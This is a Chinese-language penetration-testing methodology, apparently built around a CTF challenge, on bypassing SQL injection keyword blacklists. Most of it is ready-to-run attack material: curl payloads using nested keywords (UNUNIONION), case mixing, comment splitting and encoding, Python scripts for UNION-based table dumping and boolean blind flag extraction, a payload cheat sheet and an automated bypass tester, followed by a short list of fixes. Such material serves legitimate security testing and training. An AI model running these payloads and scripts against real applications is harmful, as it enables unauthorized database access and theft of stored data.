# SQL 注入黑名单绕过技术方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 SQL 注入黑名单过滤绕过检测与利用流程，帮助发现和利用因使用黑名单过滤而非参数化查询导致的 SQL 注入漏洞。

## 1.2 适用范围

本文档适用于所有使用黑名单过滤机制的 Web 应用，特别是那些尝试通过字符串替换移除 SQL 关键词但未使用参数化查询的系统。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

SQL 注入黑名单绕过是指应用程序使用字符串替换等简单方法过滤 SQL 关键词（如 `OR`、`AND`、`SELECT`、`UNION` 等），但攻击者可通过编码、嵌套、大小写变化等技术绕过过滤，成功执行 SQL 注入攻击。

**本质问题**：
- 使用黑名单而非白名单验证
- 过滤逻辑存在缺陷（非递归、大小写不全）
- 过滤后仍直接拼接 SQL 查询
- 未使用参数化查询

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-89 | SQL 注入 |
| CWE-119 | 缓冲区溢出（过滤逻辑缺陷） |
| CWE-94 | 代码注入 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 搜索功能 | 商品/用户搜索 | 搜索关键词过滤不全 |
| 数据筛选 | 类型/状态筛选 | 筛选参数被过滤但仍可绕过 |
| 用户认证 | 登录表单 | 用户名/密码过滤缺陷 |
| API 接口 | RESTful API | 查询参数过滤绕过 |
| CTF 挑战应用 | 数据查询 | 故意设计的过滤绕过场景 |

## 2.3 漏洞探测方法

### 2.3.1 黑名单过滤识别

**步骤 1：基础探测**

```bash
# 测试基础 SQL 注入被过滤
curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' OR 1=1--"}'

# 如果返回正常结果（而非报错），可能存在过滤

# 测试过滤机制
curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "ORtest"}'

# 检查响应中 OR 是否被移除
```

**步骤 2：确定过滤关键词**

```bash
# 测试常见 SQL 关键词
keywords=("OR" "or" "AND" "and" "SELECT" "select" "UNION" "union" "FROM" "from" "WHERE" "where")

for keyword in "${keywords[@]}"; do
    response=$(curl -s -X POST http://target.com/jobs \
      -H "Content-Type: application/json" \
      -d "{\"job_type\": \"${keyword}test\"}")
    
    if [[ "$response" != *"$keyword"* ]]; then
        echo "[FILTERED] $keyword"
    else
        echo "[ALLOWED] $keyword"
    fi
done
```

**步骤 3：确定过滤特性**

```python
#!/usr/bin/env python3
"""
SQL 黑名单过滤特性分析脚本
"""

import requests
import json

BASE_URL = 'http://target.com/jobs'

def analyze_filter():
    """分析过滤机制特性"""
    
    # 测试 1：大小写敏感性
    print("[*] Testing case sensitivity...")
    test_cases = [
        ('ORtest', 'uppercase OR'),
        ('ortest', 'lowercase or'),
        ('Ortest', 'mixed case Or'),
        ('oRtest', 'mixed case oR'),
    ]
    
    for payload, description in test_cases:
        response = requests.post(
            BASE_URL,
            json={'job_type': payload},
            headers={'Content-Type': 'application/json'}
        )
        print(f"  {description}: {payload} -> {response.text[:50]}")
    
    # 测试 2：嵌套关键词
    print("\n[*] Testing nested keywords...")
    nested_tests = [
        ('UNUNIONION', 'nested UNION'),
        ('SELSELECTECT', 'nested SELECT'),
        ('ORor', 'nested OR'),
        ('ANDand', 'nested AND'),
    ]
    
    for payload, description in nested_tests:
        response = requests.post(
            BASE_URL,
            json={'job_type': payload},
            headers={'Content-Type': 'application/json'}
        )
        print(f"  {description}: {payload} -> {response.text[:50]}")
    
    # 测试 3：过滤是否递归
    print("\n[*] Testing recursion...")
    recursive_payload = 'UNUNIONION'
    # 如果过滤递归：UNUNIONION -> UNION -> (空)
    # 如果过滤非递归：UNUNIONION -> UNION
    
    response = requests.post(
        BASE_URL,
        json={'job_type': recursive_payload},
        headers={'Content-Type': 'application/json'}
    )
    print(f"  Nested UNION result: {response.text[:50]}")

if __name__ == '__main__':
    analyze_filter()
```

### 2.3.2 白盒代码审计

**危险模式识别**：

```python
# ❌ 危险代码模式 1：简单字符串替换
def sanitize_input(user_input):
    for keyword in ['OR', 'or', 'AND', 'and', 'SELECT', 'UNION']:
        user_input = user_input.replace(keyword, '')
    return user_input

# ❌ 危险代码模式 2：非递归过滤
def filter_sql_keywords(input_str):
    keywords = ['OR', 'or', 'SELECT', 'select']
    for kw in keywords:
        input_str = input_str.replace(kw, '')
    # 只遍历一次，不递归
    return input_str

# ❌ 危险代码模式 3：过滤后仍拼接 SQL
query = f"SELECT * FROM jobs WHERE type = '{sanitize_input(job_type)}'"
```

**审计关键词**：
- `.replace()` 用于输入过滤
- 黑名单数组定义
- f-string 或 `+` 拼接 SQL 查询
- 缺少参数化查询

## 2.4 漏洞利用方法

### 2.4.1 嵌套关键词绕过

**原理**：当过滤器只执行单次遍历时，嵌套关键词可绕过

```bash
# 测试用例 1：嵌套 UNION
# 输入：UNUNIONION
# 过滤过程：UNUNIONION -> (移除 UNION) -> UNION
# 结果：成功保留 UNION

curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' UNUNIONION SELSELECTECT 1,2,3--"}'

# 测试用例 2：嵌套 SELECT
# 输入：SELSELECTECT
# 过滤过程：SELSELECTECT -> (移除 SELECT) -> SELECT

curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' SELSELECTECT * FRFROMOM users--"}'

# 测试用例 3：嵌套 OR
# 输入：ORor
# 过滤过程：ORor -> (移除 OR) -> or
# 或：ORor -> (移除 or) -> OR

curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' ORor 1=1--"}'
```

**完整利用脚本**：

```python
#!/usr/bin/env python3
"""
嵌套关键词 SQL 注入利用脚本
适用于黑名单过滤场景
"""

import requests
import json

BASE_URL = 'http://target.com/jobs'

def extract_database_info():
    """提取数据库信息"""
    
    # 步骤 1：确定列数
    print("[*] Determining number of columns...")
    for i in range(1, 20):
        columns = ','.join([str(x) for x in range(1, i+1)])
        payload = f"' UNUNIONION SELSELECTECT {columns}--"
        
        response = requests.post(
            BASE_URL,
            json={'job_type': payload},
            headers={'Content-Type': 'application/json'}
        )
        
        if response.status_code == 200 and 'error' not in response.text.lower():
            print(f"[+] Found {i} columns")
            num_columns = i
            break
    
    # 步骤 2：获取数据库版本
    print("\n[*] Extracting database version...")
    payload = f"' UNUNIONION SELSELECTECT sqlite_version(),2,3,4--"
    response = requests.post(
        BASE_URL,
        json={'job_type': payload},
        headers={'Content-Type': 'application/json'}
    )
    print(f"[+] Database version: {response.text}")
    
    # 步骤 3：获取表名
    print("\n[*] Extracting table names...")
    payload = f"' UNUNIONION SELSELECTECT 1,name,3,4 FRFROMOM sqlite_master WHWHEREERE type='table'--"
    response = requests.post(
        BASE_URL,
        json={'job_type': payload},
        headers={'Content-Type': 'application/json'}
    )
    print(f"[+] Tables: {response.text}")
    
    # 步骤 4：获取敏感数据
    print("\n[*] Extracting sensitive data...")
    payload = f"' UNUNIONION SELSELECTECT id,name,type,description FRFROMOM jobs--"
    response = requests.post(
        BASE_URL,
        json={'job_type': payload},
        headers={'Content-Type': 'application/json'}
    )
    data = response.json()
    for record in data:
        print(f"  {record}")
    
    return data

if __name__ == '__main__':
    extract_database_info()
```

### 2.4.2 大小写变化绕过

**原理**：当黑名单只包含特定大小写组合时

```bash
# 测试用例 1：混合大小写
# 黑名单：['OR', 'or']
# 绕过：'oR' 或 'Or'

curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' oR 1=1--"}'

# 测试用例 2：完全混合
curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' UnIoN SeLeCt 1,2,3--"}'

# 测试用例 3：系统化测试
for case in "oR" "Or" "aN" "AnD" "uN" "UnIoN" "sE" "SeLeCt"; do
    response=$(curl -s -X POST http://target.com/jobs \
      -H "Content-Type: application/json" \
      -d "{\"job_type\": \"' $case 1=1--\"}")
    echo "$case: $response"
done
```

### 2.4.3 注释绕过

**原理**：使用 SQL 注释分割关键词

```bash
# 使用 C 风格注释
curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' UN/**/ION SEL/**/ECT 1,2,3--"}'

# 使用 SQL 注释
curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' OR -- comment\n1=1--"}'
```

### 2.4.4 布尔盲注绕过

**原理**：当直接回显被过滤时，使用布尔条件判断

```bash
# 基于布尔的注入
curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' oR SUBSTR((SELSELECTECT description FRFROMOM jobs LIMIT 1),1,1)='"'"'f'"'"'--"}'

# 如果返回结果，说明第一个字符是 'f'
```

### 2.4.5 完整数据提取

```python
#!/usr/bin/env python3
"""
SQL 注入黑名单绕过 - 完整数据提取脚本
"""

import requests
import string

BASE_URL = 'http://target.com/jobs'

def extract_flag():
    """提取 CTF Flag"""
    
    # 已知 Flag 格式：flag{...}
    flag = "flag{"
    position = 5  # 从第 5 个字符开始（flag{之后）
    
    while True:
        found = False
        
        for char in string.printable:
            # 构建 Payload：检查第 position 个字符是否为 char
            payload = f"' oR SUBSTR((SELSELECTECT description FRFROMOM jobs WHWHEREERE type='private'),{position},1)='{char}'--"
            
            response = requests.post(
                BASE_URL,
                json={'job_type': payload},
                headers={'Content-Type': 'application/json'}
            )
            
            # 如果返回结果，说明字符匹配
            if response.status_code == 200 and len(response.json()) > 0:
                flag += char
                print(f"[+] Flag so far: {flag}")
                found = True
                break
        
        if not found:
            # 检查是否到达 Flag 结尾
            if flag.endswith('}'):
                print(f"\n[SUCCESS] Complete Flag: {flag}")
                return flag
            else:
                print(f"[-] Stuck at position {position}")
                break
        
        position += 1
    
    return flag

if __name__ == '__main__':
    extract_flag()
```

## 2.5 漏洞利用绕过方法

### 2.5.1 多重嵌套绕过

**场景**：当过滤器执行多次遍历时

```bash
# 双重嵌套
# 输入：UNUNUNIONIONION
# 第一遍：UNUNUNIONIONION -> UNUNIONION
# 第二遍：UNUNIONION -> UNION

curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' UNUNUNIONIONION SELSELSELECTECT 1,2,3--"}'
```

### 2.5.2 URL 编码绕过

```bash
# URL 编码关键词
# %55%4E%49%4F%4E = UNION

curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' %55%4E%49%4F%4E %53%45%4C%45%43%54 1,2,3--"}'

# 双重 URL 编码
# %2555%254E%2549%254F%254E = %UNION

curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' %2555%254E%2549%254F%254E--"}'
```

### 2.5.3 Unicode 绕过

```bash
# 使用 Unicode 等价字符
# U+004F (O) + U+030F (重音符) = Ó (可能被规范化为 O)

curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' OR 1=1--"}'  # 包含 Unicode 变体
```

### 2.5.4 内联注释绕过

```bash
# MySQL 内联注释（版本特定）
/*!50000UNION*/ /*!50000SELECT*/

curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--"}'
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 绕过技术 | Payload 示例 | 适用场景 |
|---------|------------|---------|
| 嵌套 UNION | `UNUNIONION` | 单次遍历过滤 |
| 嵌套 SELECT | `SELSELECTECT` | 单次遍历过滤 |
| 大小写变化 | `oR`, `UnIoN` | 大小写敏感过滤 |
| 注释分割 | `UN/**/ION` | 简单字符串匹配 |
| URL 编码 | `%55%4E%49%4F%4E` | 未解码过滤 |
| 双重嵌套 | `UNUNUNIONIONION` | 多次遍历过滤 |

## 3.2 自动化检测脚本

```python
#!/usr/bin/env python3
"""
SQL 黑名单绕过自动化检测工具
"""

import requests

class SQLBypassTester:
    def __init__(self, url, param, data_format='json'):
        self.url = url
        self.param = param
        self.data_format = data_format
        
        # 测试 Payload 库
        self.payloads = {
            'nested': [
                "' UNUNIONION SELSELECTECT 1,2,3--",
                "' ORor 1=1--",
                "' ANDand 1=1--",
            ],
            'case': [
                "' oR 1=1--",
                "' UnIoN SeLeCt 1,2,3--",
                "' aNd 1=1--",
            ],
            'comment': [
                "' UN/**/ION SEL/**/ECT 1,2,3--",
                "' OR/**/1=1--",
            ],
        }
    
    def test_payloads(self, category):
        """测试特定类别的 Payload"""
        results = []
        
        for payload in self.payloads[category]:
            if self.data_format == 'json':
                data = {self.param: payload}
                response = requests.post(
                    self.url,
                    json=data,
                    headers={'Content-Type': 'application/json'}
                )
            else:
                data = {self.param: payload}
                response = requests.post(self.url, data=data)
            
            # 判断是否成功
            if response.status_code == 200:
                results.append((payload, 'SUCCESS', response.text[:100]))
            else:
                results.append((payload, 'FAILED', f'Status {response.status_code}'))
        
        return results
    
    def run_all_tests(self):
        """运行所有测试"""
        print("[*] Starting SQL blacklist bypass tests...\n")
        
        for category in self.payloads:
            print(f"[*] Testing {category} bypasses...")
            results = self.test_payloads(category)
            
            for payload, status, response in results:
                if status == 'SUCCESS':
                    print(f"  [✓] {payload[:40]}...")
                else:
                    print(f"  [✗] {payload[:40]}...")
            print()

if __name__ == '__main__':
    tester = SQLBypassTester(
        url='http://target.com/jobs',
        param='job_type',
        data_format='json'
    )
    tester.run_all_tests()
```

## 3.3 修复建议

1. **使用参数化查询** - 始终使用 PreparedStatement 或参数化查询
2. **白名单验证** - 只允许预期的输入值
3. **ORM 框架** - 使用 ORM 自动处理 SQL 转义
4. **最小权限原则** - 数据库账户使用最小必要权限
5. **输入长度限制** - 限制输入长度减少攻击面

---

**参考资源**：
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger - SQL Injection](https://portswigger.net/web-security/sql-injection)
- [SQLMap Tamper Scripts](https://github.com/sqlmapproject/sqlmap/tree/master/tamper)
